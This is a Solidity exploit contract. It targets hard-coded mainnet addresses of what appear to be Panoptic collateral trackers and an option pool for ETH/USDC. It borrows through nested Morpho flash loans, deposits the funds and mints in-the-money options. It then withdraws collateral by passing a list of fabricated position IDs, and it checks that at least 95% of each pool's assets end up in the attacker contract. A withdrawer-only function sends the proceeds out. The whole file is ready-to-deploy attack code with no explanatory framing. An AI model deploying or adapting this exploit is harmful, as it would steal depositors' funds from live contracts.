// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract ETH_USDC5bpsMainnetAttacker_Deployer {
    ETH_USDC5bpsMainnetAttacker public attacker;
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Partial token1 = IERC20Partial(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)); // usdc
    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x25d2c450078BB12d858cC86e057974fdE5dE55e2));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0x5141069163664fb6FA2E8563191cF4ddB9783e0A));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new ETH_USDC5bpsMainnetAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = WETH.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract ETH_USDC5bpsMainnetAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [17035745045722363, 16993655162578412, 16939609024273842, 17158553267796065, 17107685890532457, 17083582814389265, 16898430492320797, 17101708812844843, 16927858255610090, 17069357979992109, 17086352299123725, 16916111252789762, 17003795739444277, 17026568887818250, 17119985327481433, 17029994500126407, 17006045362593199, 16936522326425929, 16945967490755149, 17082751614160489, 17063366226512834, 16905884702516433, 17066504289794370, 17119504401467382, 16920834318597884, 17034803466092545, 16942964596981210, 17025612530710537, 16889820611195521, 16954544221541041, 16904132411153761, 16949521359855531, 16920216715452750, 17129587578817479, 17085189125086153, 16988002051593903, 16914178675719633, 17126645520732798, 17074540876198711, 17119951603807036, 17119329401324348, 17122846506677707, 17018492495701600, 17049620233322987, 17097995700960721, 17142266941213954, 16997018527186481, 17130624793684447, 17024105470881979, 16910690735799991, 17073996118339521, 17036439949713896, 17003020264083211, 17093568332869701, 16969179392893693, 17103589480369901, 17008221870292762, 16989238486935005, 17126049222761791, 17142166672779123, 17144420237880467, 17101150678162124, 16934049758747081, 16894635486029112, 16923138720850302, 17114373863952007, 16963022048440415, 16992821954860765, 17027825720482802, 16992964215424125, 16942409542027123, 17100042690718021, 16969369082248421, 16905463410247128, 17052541747857150, 17063547626636328, 17038292193577029, 17029512578671493, 16975851747102136, 17130759040409663, 17101208203141327, 16894658434788774, 16938993875545352, 17072849265831395, 17022720534783960, 17017661774688634, 17118102226994995, 16908153974732775, 16913597968133068, 17014445553286162, 16974767401004252, 16894355756410939, 17119602343874712, 16908893219668699, 17129841125473381, 17099849001593597, 17153702279128601, 17020691157262149, 16897926812058864, 17122672512185594, 17044600072961146, 16988827310790466, 17045419378318324, 17050277920000050, 16930194949943667, 16907480429887088, 16934457177659003, 17115324528783460, 17072588196537057, 16998536847852287, 17140315683590255, 16935870331365850, 17128654064464828, 16905067998086360, 17022423542452956, 17151127052636987, 17094514593261230, 16987242283774540, 16888769806416760, 17029198303267245, 17050369048063491, 16972063987353239, 16947327288449607, 16996711919775464, 16968761966455866, 16942458681986566, 17057227897167136, 17029873506273690, 16990649632113938, 17060232259853742, 16913491436315882, 16919590554483084, 16993502753544935, 17167047696388934, 17157376839885919, 16889202049759961, 16968143087326031, 17025796118226330, 17057008683916553, 17087643854683771, 16921290824134246, 16932248563778116, 16991286763756420, 17030010218713865, 16943603167087332, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On mainnet
    address token0 = address(0); // native eth
    IERC20Partial token1 = IERC20Partial(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)); // usdc
    IMorpho morpho = IMorpho(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));

    // Need this for flash loaning:
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x25d2c450078BB12d858cC86e057974fdE5dE55e2));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0x5141069163664fb6FA2E8563191cF4ddB9783e0A));
    IPanopticPool_v4 pp = IPanopticPool_v4(address(0xdfbfe4c03508648589120350f96E05c780EB6e50));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            // passing in WETH, not token0, as the asset to borrow, as token0 is ETH which is not flash-loanable
            morpho.flashLoan(address(WETH), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            WETH.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        WETH.withdraw(attackAmount0);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit{value: attackAmount0}(uint128(attackAmount0), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283210681798027823655);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283210681798027823655);
        posIdList2[1] = TokenId.wrap(2560008631394908957630439541287);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList, false);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList, false);

        // Re-wrap the WETH to ultimately pay back the flash loan + keep profits in WETH, not ETH
        WETH.deposit{value: toWithdraw0}();

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
